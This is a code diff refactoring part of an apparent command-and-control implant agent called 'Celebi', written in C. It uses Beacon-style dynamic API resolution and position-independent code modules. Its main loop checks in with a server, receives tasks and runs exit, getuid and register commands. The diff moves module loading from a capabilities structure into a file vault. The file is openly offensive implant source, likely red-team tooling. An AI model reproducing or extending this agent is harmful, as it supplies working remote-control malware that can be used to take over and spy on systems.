@@ -29,7 +29,7 @@ FARPROC resolve_unloaded(char * mod, char * func) {
 	return KERNEL32$GetProcAddress(hModule, func);
 }
 
-void agent_exit(AgentState *state, AgentCapabilities *cap, TaskInfo *task) {
+void agent_exit(AgentState *state, TaskInfo *task) {
 	if (task != NULL) {
 		TaskPostReply reply = { 0 };
 		BOOL result = perform_post(state, task, &reply, "", "success");
@@ -44,7 +44,6 @@ void agent_exit(AgentState *state, AgentCapabilities *cap, TaskInfo *task) {
 	HttpDestroy(state->http);
 	free_params(&state->params);
 	free_vault(&state->file_vault);
-	free_builtin_picos(cap);	
 	
 	#ifdef CELEBI_EXIT_THREAD
 	KERNEL32$ExitThread(0);
@@ -53,8 +52,10 @@ void agent_exit(AgentState *state, AgentCapabilities *cap, TaskInfo *task) {
 	#endif
 }
 
-void agent_getuid(AgentState *state, AgentCapabilities *cap, TaskInfo *task) {
-	char *username = cap->GetuidPicoEntrypoint();
+void agent_getuid(AgentState *state, TaskInfo *task) {
+	ResolvedPico pico = resolve_loaded_pico(&state->file_vault, "_builtin_getuid");
+	GETUID_PICO entrypoint = (GETUID_PICO) pico.entrypoint;
+	char *username = entrypoint();
 	
 	BOOL result;
 	TaskPostReply reply = { 0 };
@@ -69,9 +70,11 @@ void agent_getuid(AgentState *state, AgentCapabilities *cap, TaskInfo *task) {
 		dprintf("Server acknowledged getuid output.");
 	}
 	#endif
+	
+	free_resolved_pico(&pico);
 }
 
-void agent_register(AgentState *state, AgentCapabilities *cap, TaskInfo *task) {
+void agent_register(AgentState *state, TaskInfo *task) {
 	char *name = MSVCRT$strtok(task->parameters, "\t");
 	char *uuid = MSVCRT$strtok(NULL, "\t");
 
@@ -114,13 +117,13 @@ void agent_register(AgentState *state, AgentCapabilities *cap, TaskInfo *task) {
 	free_upload_manager(&upload);
 }
 
-void process_task(TaskInfo *task, AgentState *state, AgentCapabilities *cap) {
+void process_task(TaskInfo *task, AgentState *state) {
 	if (MSVCRT$strcmp(task->command, "exit") == 0) {
 		#ifdef CELEBI_DEBUG
 		dprintf("Received exit command.");
 		#endif
 		
-		agent_exit(state, cap, task);
+		agent_exit(state, task);
 		return;
 	}
 	
@@ -129,7 +132,7 @@ void process_task(TaskInfo *task, AgentState *state, AgentCapabilities *cap) {
 		dprintf("Received getuid command.");
 		#endif
 		
-		agent_getuid(state, cap, task);
+		agent_getuid(state, task);
 		return;
 	}
 	
@@ -138,7 +141,7 @@ void process_task(TaskInfo *task, AgentState *state, AgentCapabilities *cap) {
 		dprintf("Received register command with parameters: '%s'", task->parameters);
 		#endif
 		
-		agent_register(state, cap, task);
+		agent_register(state, task);
 		return;
 	}
 	
@@ -149,7 +152,6 @@ void process_task(TaskInfo *task, AgentState *state, AgentCapabilities *cap) {
 
 void go() {
 	AgentState state = { 0 };
-	AgentCapabilities capabilities = { 0 };
 	
 	unpack_params(RAW_PARAMS, &state.params);
 	
@@ -163,7 +165,7 @@ void go() {
 	dprintf("Vault allocated.");
 	#endif
 	
-	load_builtin_picos(&capabilities);
+	load_builtin_picos(&state.file_vault);
 	
 	#ifdef CELEBI_DEBUG
 	dprintf("Loaded PICO capabilities.");
@@ -176,7 +178,7 @@ void go() {
 	#endif
 	
 	CheckinReply checkin_reply = { 0 };
-	BOOL checkin_result = perform_checkin(&state, &capabilities, &checkin_reply);
+	BOOL checkin_result = perform_checkin(&state, &checkin_reply);
 	
 	if ((checkin_result == FALSE) || (checkin_reply.status == NULL) || (MSVCRT$strcmp(checkin_reply.status, "success") != 0)) {
 		#ifdef CELEBI_DEBUG
@@ -184,7 +186,7 @@ void go() {
 		#endif
 		
 		free_checkin_reply(&checkin_reply);
-		agent_exit(&state, &capabilities, NULL);
+		agent_exit(&state, NULL);
 		return;
 	}
 	
@@ -215,7 +217,7 @@ void go() {
 		}
 		
 		for (int i = 0; i < tasking_reply.tasking_size; i++) {
-			process_task(&tasking_reply.tasks[i], &state, &capabilities);
+			process_task(&tasking_reply.tasks[i], &state);
 		}
 		
 		free_tasking_reply(&tasking_reply);
